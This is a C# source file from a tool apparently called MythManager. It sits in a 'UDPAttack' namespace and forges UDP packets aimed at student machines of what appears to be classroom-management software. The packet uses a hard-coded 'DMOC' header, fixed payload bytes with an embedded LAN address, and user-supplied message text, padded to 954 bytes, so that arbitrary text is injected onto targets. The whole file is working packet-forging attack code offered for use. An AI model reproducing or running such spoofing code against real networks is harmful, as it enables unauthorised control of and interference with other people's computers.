﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Controls;

namespace MythManager.Pages.UDPAttack.AttackFunctions
{
    /// <summary>
    /// MessageAttackxaml.xaml 的交互逻辑
    /// </summary>
    [UDPAttackType("发送消息", nameof(ConstructPacket), AttackTarget.Student)]
    public partial class MessageAttackxaml : UserControl
    {
        public MessageAttackxaml()
        {
            InitializeComponent();
        }
        public AttackPacket ConstructPacket(ref string message)
        {
            byte[] packet;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                // Header bytes
                byte[] headerBytes = new byte[]
                {
            0x44, 0x4D, 0x4F, 0x43, 0x00, 0x00, 0x01, 0x00,
            0x9E, 0x03, 0x00, 0x00
                };
                memoryStream.Write(headerBytes, 0, headerBytes.Length);

                // Random bytes
                byte[] randomBytes = new byte[16];
                new Random().NextBytes(randomBytes);
                memoryStream.Write(randomBytes, 0, randomBytes.Length);

                // Payload bytes
                byte[] payloadBytes = new byte[]
                {
            0x20, 0x4E, 0x00, 0x00, 0xC0, 0xA8, 0x89, 0x80,
            0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00,
            0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x05, 0x00, 0x00, 0x00
                };
                memoryStream.Write(payloadBytes, 0, payloadBytes.Length);

                // Command text bytes
                byte[] commandTextBytes = Encoding.Unicode.GetBytes(Message.Text);
                memoryStream.Write(commandTextBytes, 0, commandTextBytes.Length);

                int currentPacketLength = (int)memoryStream.Length;
                if (currentPacketLength < 954)
                {
                    byte[] paddingBytes = new byte[954 - currentPacketLength];
                    memoryStream.Write(paddingBytes, 0, paddingBytes.Length);
                }
                else if (currentPacketLength > 954)
                {
                    message = string.Format("Packet length exceeds 954 bytes (current: {0})", currentPacketLength);
                }

                packet = memoryStream.ToArray();
            }
            return new AttackPacket(new List<byte[]> { packet });
        }

    }
}
